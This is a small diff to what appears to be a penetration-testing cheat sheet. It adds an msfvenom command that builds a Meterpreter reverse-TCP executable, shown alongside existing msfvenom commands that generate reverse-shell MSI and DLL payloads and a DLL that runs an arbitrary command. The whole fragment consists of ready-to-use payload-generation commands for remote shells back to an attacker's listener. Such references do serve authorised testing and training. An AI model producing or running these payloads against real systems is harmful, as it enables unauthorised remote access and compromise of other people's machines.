@@ -93,6 +93,8 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi -o shel
 # Generate a malicious dynamic library (DLL)
 $ msfvenom -p windows/x64/exec cmd='<some command>' -f dll -o malicious.dll
 $ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o malicious.dll
+# Meterpreter - use the same payload in multi/handler
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
 ```
 </div><div>
 
